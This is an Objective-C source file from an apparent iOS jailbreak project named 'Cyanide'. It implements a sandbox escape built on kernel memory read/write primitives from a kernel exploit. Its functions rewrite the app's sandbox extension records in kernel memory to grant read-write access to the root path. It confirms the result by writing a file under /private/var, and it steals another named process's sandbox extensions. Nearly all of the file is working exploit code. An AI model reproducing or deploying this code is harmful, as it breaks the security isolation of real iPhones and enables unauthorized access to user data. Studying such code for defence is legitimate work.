//
//  sandbox.m
//  Cyanide
//
//  Created by seo on 4/6/26.
//

#import <Foundation/Foundation.h>
#import <dirent.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <limits.h>
#import <stdlib.h>
#import <string.h>
#import <unistd.h>
#import <sys/mount.h>
#import <sys/stat.h>

#import "sandbox.h"
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/krw.h"
#import "../kexploit/kutils.h"
#import "../kexploit/vnode.h"
#import "../kexploit/offsets.h"
#import "../research/sandbox_research.h"
#import "../kexploit/kexploit_opa334.h"


#define CY_IOS16_KRW_LEN 0x20
#define CY_IOS16_OFF_SANDBOX_EXT_TABLE 0x08
#define CY_IOS16_OFF_SANDBOX_EXT_SET   0x10
#define CY_IOS16_OFF_EXT_DATA          0x40
#define CY_IOS16_OFF_EXT_DATALEN       0x48
#define CY_IOS16_OFF_EXT_META          0x50
#define CY_IOS16_BUCKET_COUNT          18
#define CY_IOS16_TARGET_PATH           "/"

static BOOL cyanide_is_ios16(void)
{
    NSOperatingSystemVersion version = NSProcessInfo.processInfo.operatingSystemVersion;
    return version.majorVersion == 16;
}

static bool cy_ios16_kptr(uint64_t ptr)
{
    return is_kaddr_valid(ptr);
}

static bool cy_ios16_write64_in_block(uint64_t addr, uint64_t value)
{
    uint64_t base = addr & ~(uint64_t)(CY_IOS16_KRW_LEN - 1);
    uint64_t off = addr - base;
    if (off + sizeof(uint64_t) > CY_IOS16_KRW_LEN) return false;

    uint8_t buf[CY_IOS16_KRW_LEN];
    kreadbuf(base, buf, CY_IOS16_KRW_LEN);
    *(uint64_t *)(buf + off) = value;
    kwrite_zone_element(base, buf, CY_IOS16_KRW_LEN);
    return true;
}

static bool cy_ios16_class_name_is(uint64_t class_ptr, const char *expected)
{
    if (!cy_ios16_kptr(class_ptr) || !expected) return false;

    size_t len = strlen(expected);
    if (len > 32) len = 32;

    char got[33] = {0};
    for (size_t off = 0; off < len; off += sizeof(uint64_t)) {
        uint64_t q = kread64(class_ptr + off);
        size_t n = len - off;
        if (n > sizeof(uint64_t)) n = sizeof(uint64_t);
        memcpy(got + off, &q, n);
    }
    return memcmp(got, expected, len) == 0;
}

static bool cy_ios16_class_name_known(uint64_t class_ptr)
{
    return cy_ios16_class_name_is(class_ptr, "com.apple.sandbox.container") ||
           cy_ios16_class_name_is(class_ptr, "com.apple.sandbox.executable") ||
           cy_ios16_class_name_is(class_ptr, "com.apple.app-sandbox.read") ||
           cy_ios16_class_name_is(class_ptr, "com.apple.app-sandbox.read-write") ||
           cy_ios16_class_name_is(class_ptr, "com.apple.app-sandbox.write");
}

static bool cy_ios16_ext_table_looks_valid(uint64_t table)
{
    if (!cy_ios16_kptr(table)) return false;

    for (int bucket = 0; bucket < CY_IOS16_BUCKET_COUNT; bucket++) {
        uint64_t node = kread_ptr(table + (uint64_t)bucket * sizeof(uint64_t));
        for (int depth = 0; depth < 8 && cy_ios16_kptr(node); depth++) {
            uint64_t next_node = kread_ptr(node);
            uint64_t ext = kread_ptr(node + 0x08);
            uint64_t class_ptr = kread_ptr(node + 0x10);
            if (cy_ios16_class_name_known(class_ptr) && cy_ios16_kptr(ext)) {
                uint64_t path = kread_ptr(ext + CY_IOS16_OFF_EXT_DATA);
                uint64_t len = kread64(ext + CY_IOS16_OFF_EXT_DATALEN);
                if (cy_ios16_kptr(path) && len > 0 && len < PATH_MAX) return true;
            }
            if (!next_node || next_node == node) break;
            node = next_node;
        }
    }
    return false;
}

static uint64_t cy_ios16_extension_table(uint64_t sandbox)
{
    uint64_t table = kread_ptr(sandbox + CY_IOS16_OFF_SANDBOX_EXT_TABLE);
    if (cy_ios16_ext_table_looks_valid(table)) return table;

    table = kread_ptr(sandbox + CY_IOS16_OFF_SANDBOX_EXT_SET);
    if (cy_ios16_ext_table_looks_valid(table)) return table;

    return 0;
}

static char *cy_ios16_issue_token(const char *extension_class, const char *path)
{
    if (!extension_class || !path) return NULL;

    void *h = dlopen("libsandbox.dylib", RTLD_NOW);
    if (!h) h = dlopen("/usr/lib/libsandbox.dylib", RTLD_NOW);
    if (!h) return NULL;

    typedef char *(*issue_file_t)(const char *, const char *, int);
    typedef void (*free_token_t)(char *);

    issue_file_t issue_to_self = (issue_file_t)dlsym(h, "sandbox_extension_issue_file_to_self");
    issue_file_t issue_file = (issue_file_t)dlsym(h, "sandbox_extension_issue_file");

    char *token = issue_to_self ? issue_to_self(extension_class, path, 0) : NULL;
    if (!token && issue_file) token = issue_file(extension_class, path, 0);
    if (!token) return NULL;

    char *copy = strdup(token);
    free_token_t free_token = (free_token_t)dlsym(h, "sandbox_extension_free");
    if (free_token) free_token(token);
    else free(token);
    return copy;
}

static int64_t cy_ios16_seed_path(NSString *path)
{
    if (path.length == 0) return -1;

    const char *classes[] = {
        "com.apple.app-sandbox.read-write",
        "com.apple.app-sandbox.read",
        "com.apple.app-sandbox.write",
    };

    const char *cpath = path.fileSystemRepresentation;
    for (size_t i = 0; i < sizeof(classes) / sizeof(classes[0]); i++) {
        char *token = cy_ios16_issue_token(classes[i], cpath);
        if (!token) continue;

        int64_t handle = sandbox_extension_consume(token);
        free(token);
        return handle;
    }
    return -1;
}

static int64_t cy_ios16_seed_probe(void)
{
    @autoreleasepool {
        NSArray<NSString *> *dirs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *docs = dirs.firstObject ?: NSHomeDirectory();
        NSString *probe = [docs stringByAppendingPathComponent:@"cyanide-sbx-probe"];
        if (probe.length == 0) return -1;

        [NSFileManager.defaultManager createDirectoryAtPath:probe
                                withIntermediateDirectories:YES
                                                 attributes:nil
                                                      error:nil];
        return cy_ios16_seed_path(probe);
    }
}

static bool cy_ios16_find_extension(uint64_t sandbox, const char *class_name, int64_t handle, bool any_handle, uint64_t *out_ext)
{
    if (out_ext) *out_ext = 0;
    uint64_t table = cy_ios16_extension_table(sandbox);
    if (!cy_ios16_kptr(table)) return false;

    for (int bucket = 0; bucket < CY_IOS16_BUCKET_COUNT; bucket++) {
        uint64_t node = kread_ptr(table + (uint64_t)bucket * sizeof(uint64_t));
        for (int node_depth = 0; node_depth < 8 && cy_ios16_kptr(node); node_depth++) {
            uint64_t next_node = kread_ptr(node);
            uint64_t ext = kread_ptr(node + 0x08);
            uint64_t class_ptr = kread_ptr(node + 0x10);
            if (cy_ios16_class_name_is(class_ptr, class_name)) {
                for (int ext_depth = 0; ext_depth < 8 && cy_ios16_kptr(ext); ext_depth++) {
                    uint64_t next_ext = kread_ptr(ext);
                    uint64_t ext_handle = kread64(ext + 0x08);
                    if (any_handle || (int64_t)ext_handle == handle) {
                        if (out_ext) *out_ext = ext;
                        return true;
                    }
                    if (!next_ext || next_ext == ext) break;
                    ext = next_ext;
                }
            }
            if (!next_node || next_node == node) break;
            node = next_node;
        }
    }
    return false;
}

static bool cy_ios16_path_has_prefix(uint64_t addr, const char *prefix)
{
    if (!cy_ios16_kptr(addr) || !prefix) return false;

    size_t len = strlen(prefix);
    char got[PATH_MAX] = {0};
    if (len >= sizeof(got)) return false;

    for (size_t off = 0; off < len; off += sizeof(uint64_t)) {
        uint64_t q = kread64(addr + off);
        size_t n = len - off;
        if (n > sizeof(uint64_t)) n = sizeof(uint64_t);
        memcpy(got + off, &q, n);
    }
    return memcmp(got, prefix, len) == 0;
}

static bool cy_ios16_set_extension_path(uint64_t ext, const char *target)
{
    uint64_t path = kread_ptr(ext + CY_IOS16_OFF_EXT_DATA);
    if (!cy_ios16_kptr(path) || !target) return false;

    uint64_t target_len = (uint64_t)strlen(target);
    uint64_t first = path & ~(uint64_t)(CY_IOS16_KRW_LEN - 1);
    uint64_t end = path + target_len + 1;
    if (!cy_ios16_kptr(first)) return false;

    for (uint64_t base = first; base < end; base += CY_IOS16_KRW_LEN) {
        uint8_t block[CY_IOS16_KRW_LEN];
        kreadbuf(base, block, CY_IOS16_KRW_LEN);
        for (uint64_t addr = base; addr < base + CY_IOS16_KRW_LEN; addr++) {
            if (addr < path || addr >= end) continue;
            uint64_t idx = addr - path;
            block[addr - base] = (idx < target_len) ? (uint8_t)target[idx] : 0;
        }
        kwrite_zone_element(base, block, CY_IOS16_KRW_LEN);
    }

    return cy_ios16_write64_in_block(ext + CY_IOS16_OFF_EXT_DATALEN, target_len) &&
           kread64(ext + CY_IOS16_OFF_EXT_DATALEN) == target_len &&
           cy_ios16_path_has_prefix(path, target);
}

static bool cy_ios16_test_root_access(void)
{
    DIR *dir = opendir(CY_IOS16_TARGET_PATH);
    if (dir) closedir(dir);

    const char *testPath = "/private/var/mobile/Library/Preferences/cyanide-sbx-access.txt";
    int fd = open(testPath, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) return false;

    const char marker[] = "cyanide-sbx-test\n";
    ssize_t written = write(fd, marker, sizeof(marker) - 1);
    close(fd);
    int unlinked = unlink(testPath);
    return dir != NULL && written == (ssize_t)(sizeof(marker) - 1) && unlinked == 0;
}

static int cy_ios16_patch_sandbox_ext(void)
{
    uint64_t self_proc = proc_self();
    if (!self_proc) return -1;

    uint64_t label = proc_get_cred_label(self_proc);
    uint64_t sandbox = label_get_sandbox(label);
    if (!cy_ios16_kptr(sandbox)) return -1;

    int64_t probe_handle = cy_ios16_seed_probe();
    if (probe_handle < 0) {
        printf("[SANDBOX] iOS16 escape failed: no probe extension\n");
        return -1;
    }

    uint64_t probe_ext = 0;
    uint64_t container_ext = 0;
    if (!cy_ios16_find_extension(sandbox, "com.apple.app-sandbox.read-write", probe_handle, false, &probe_ext) ||
        !cy_ios16_kptr(probe_ext)) {
        printf("[SANDBOX] iOS16 escape failed: probe extension not found\n");
        return -1;
    }
    if (!cy_ios16_find_extension(sandbox, "com.apple.sandbox.container", 0, true, &container_ext) ||
        !cy_ios16_kptr(container_ext)) {
        printf("[SANDBOX] iOS16 escape failed: container extension not found\n");
        return -1;
    }

    if (!cy_ios16_write64_in_block(probe_ext + CY_IOS16_OFF_EXT_DATALEN, 1))
        return -1;

    uint64_t container_meta = kread64(container_ext + CY_IOS16_OFF_EXT_META);
    if (!cy_ios16_write64_in_block(probe_ext + CY_IOS16_OFF_EXT_META, container_meta))
        return -1;

    if (!cy_ios16_set_extension_path(probe_ext, CY_IOS16_TARGET_PATH))
        return -1;

    if (!cy_ios16_test_root_access()) {
        printf("[SANDBOX] iOS16 escape verification failed\n");
        return -1;
    }

    printf("[SANDBOX] iOS16 escape succeeded\n");
    return 0;
}

// The original idea is from https://x.com/CrazyMind90/status/2040484080622465056
// Kudos to CrazyMind90 for revealing new sbx escape technique!
// This is almost same behavior with sandbox_extension_consume with r/w on root
// Confirmed works on iPhone 14 Pro/17.2.1, iPhone SE3/26.0
int patch_sandbox_ext(void) {
    if (cyanide_is_ios16())
        return cy_ios16_patch_sandbox_ext();

    uint64_t label = proc_get_cred_label(proc_self());
    uint64_t sbx = label_get_sandbox(label);
    struct sandbox_label sbx_lbl = {0};
    kreadbuf(sbx, &sbx_lbl, sizeof(struct sandbox_label));
    uint64_t ext_set_kptr = (uint64_t)sbx_lbl.extension_set;
    
    struct extension_set ext_set = {0};
    kreadbuf(ext_set_kptr, &ext_set, sizeof(struct extension_set));
    for(int i = 0; i < 9; i++) {
        uint64_t ext_class_node_kptr = (uint64_t)ext_set.type_buckets[i];
        if(ext_class_node_kptr != 0) {
            struct extension_class_node ext_class_node = {0};
            kreadbuf(ext_class_node_kptr, &ext_class_node, sizeof(ext_class_node));
            
            char name[256] = {0};
            kreadbuf((uint64_t)ext_class_node.class_name, name, 256-1);
            
            if (strstr(name, "com.apple.sandbox.container") == NULL) {
                continue;
            }
            
            uint64_t ext_kptr = (uint64_t)ext_class_node.ext_list_head;
            if (!ext_kptr) continue;
            
            struct extension ext = {0};
            kreadbuf(ext_kptr, &ext, sizeof(ext));
            uint64_t path_buf = (uint64_t)ext.data_ptr;
            
            uint8_t root_path[] = { '/', '\0' };
            kwritebuf(path_buf, root_path, 2);
            
            const char *new_class = "com.apple.app-sandbox.read-write";
            kwritebuf(path_buf + 2, (void *)new_class, strlen(new_class) + 1);
            
            uint8_t cn_buf[0x20];
            kreadbuf(ext_class_node_kptr, cn_buf, 0x20);
            *(uint64_t *)(cn_buf + offsetof(struct extension_class_node, class_name)) = path_buf + 2;
            kwrite_zone_element(ext_class_node_kptr, cn_buf, 0x20);
            
            kwrite64(ext_kptr + offsetof(struct extension, path_len), 1);
            kwrite8(ext_kptr + offsetof(struct extension, file.consumed), 1);
            kwrite8(ext_kptr + offsetof(struct extension, file.storage_class), SC_ISSUED);
            
            struct stat st;
            stat("/", &st);
            kwrite32(ext_kptr + offsetof(struct extension, file.st_dev), (uint32_t)st.st_dev);
            kwrite64(ext_kptr + offsetof(struct extension, st_ino), (uint64_t)st.st_ino);
            
            kwrite64(ext_set_kptr + offsetof(struct extension_set, type_buckets[0]), ext_class_node_kptr);
            
            if(check_sandbox_var_rw() == -1)    return -1;

            return 0;
        }
    }
    
    return -1;
}

int check_sandbox_var_rw(void) {
    pid_t pid = getpid();
    int r = sandbox_check(pid, "file-read-data",  SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/private/var");
    int w = sandbox_check(pid, "file-write-data", SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/private/var");
    return (r == 0 && w == 0) ? 0 : -1;
}

int borrow_sandbox_ext(const char* process) {
    if (!process) return -1;

    uint64_t victim_proc = proc_find_by_name(process);
    if (!victim_proc || victim_proc == (uint64_t)-1 || !is_kaddr_valid(victim_proc)) {
        printf("borrow_sandbox_ext: process not found: %s proc=0x%llx\n",
               process, victim_proc);
        return -1;
    }

    uint64_t self_label = proc_get_cred_label(proc_self());
    if (!self_label || !is_kaddr_valid(self_label)) {
        printf("borrow_sandbox_ext: invalid self label=0x%llx\n", self_label);
        return -1;
    }
    uint64_t self_sbx = label_get_sandbox(self_label);
    if (!self_sbx || !is_kaddr_valid(self_sbx)) {
        printf("borrow_sandbox_ext: invalid self sandbox=0x%llx\n", self_sbx);
        return -1;
    }
    
    struct sandbox_label self_sbx_lbl = {0};
    kreadbuf(self_sbx, &self_sbx_lbl, sizeof(struct sandbox_label));
    uint64_t self_ext_set_kptr = (uint64_t)self_sbx_lbl.extension_set;
    printf("self_sbx_lbl->ext_set = 0x%llx\n", self_ext_set_kptr);
    if (!self_ext_set_kptr || !is_kaddr_valid(self_ext_set_kptr)) {
        printf("borrow_sandbox_ext: invalid self extension set=0x%llx\n", self_ext_set_kptr);
        return -1;
    }

    uint64_t victim_label = proc_get_cred_label(victim_proc);
    if (!victim_label || !is_kaddr_valid(victim_label)) {
        printf("borrow_sandbox_ext: invalid victim label for %s label=0x%llx\n",
               process, victim_label);
        return -1;
    }
    uint64_t victim_sbx = label_get_sandbox(victim_label);
    if (!victim_sbx || !is_kaddr_valid(victim_sbx)) {
        printf("borrow_sandbox_ext: invalid victim sandbox for %s sandbox=0x%llx\n",
               process, victim_sbx);
        return -1;
    }
    
    struct sandbox_label victim_sbx_lbl = {0};
    kreadbuf(victim_sbx, &victim_sbx_lbl, sizeof(struct sandbox_label));
    uint64_t victim_ext_set_kptr = (uint64_t)victim_sbx_lbl.extension_set;
    printf("victim_sbx_lbl->ext_set = 0x%llx\n", victim_ext_set_kptr);
    if (!victim_ext_set_kptr || !is_kaddr_valid(victim_ext_set_kptr)) {
        printf("borrow_sandbox_ext: invalid victim extension set for %s ext=0x%llx\n",
               process, victim_ext_set_kptr);
        return -1;
    }
    
    
    struct extension_set self_ext_set = {0};
    kreadbuf(self_ext_set_kptr, &self_ext_set, sizeof(struct extension_set));
    struct extension_set victim_ext_set = {0};
    kreadbuf(victim_ext_set_kptr, &victim_ext_set, sizeof(struct extension_set));
    
    for(int i = 0; i < 9; i++) {
        uint64_t what = kread64(victim_ext_set_kptr + offsetof(struct extension_set, type_buckets[i]));
        kwrite64(self_ext_set_kptr + offsetof(struct extension_set, type_buckets[i]), what);
    }
    
    return 0;
}
